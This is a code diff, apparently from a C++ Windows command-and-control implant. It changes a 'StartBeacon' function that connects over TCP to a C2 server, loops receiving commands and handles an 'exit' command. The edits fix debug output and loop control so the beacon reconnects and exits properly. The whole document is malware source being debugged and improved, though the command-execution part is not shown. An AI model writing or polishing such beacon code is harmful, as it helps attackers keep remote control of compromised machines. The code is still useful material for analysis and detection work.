@@ -147,18 +147,18 @@ void StartBeacon(char* C2Server, int C2Port)
 
 		int SOCK_STATE;
 		SOCK_STATE = connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr));
-		std::cout << "[DBG] Connected to " << C2Server << ":" << C2Port << std::endl;
-
+		
 		// This if statement performs connection and triggers if connection to C&C errored out.
 		if (SOCK_STATE==SOCKET_ERROR) {
-			std::cout << "[-] Socket created with error..\n";
+			std::cout << "[-] Connection unsuccessful...\n";
 			closesocket(tcpsock);
 			WSACleanup();
 			continue;
 		}
-
+		
 		// Else connection successfull..
 		else {
+			std::cout << "[DBG] Connected to " << C2Server << ":" << C2Port << std::endl;
 			// ----------------
 			while (true) {
 				
@@ -174,7 +174,7 @@ void StartBeacon(char* C2Server, int C2Port)
 					std::cout << "[DBG] RECVCODE = 0\n";
 					closesocket(tcpsock);
 					WSACleanup();
-					continue;
+					break;
 				}
 				// Connection verification block END
 				// ------------------
@@ -215,7 +215,7 @@ void StartBeacon(char* C2Server, int C2Port)
 					std::cout << "Command parsed: exit" << std::endl;
 					std::cout << "Closing connection..." << std::endl;
 					Sleep(1000);
-					continue;
+					break;
 				}
 				else {
 					std::cout << "[DBG]  Command received: " << RecvData << std::endl;
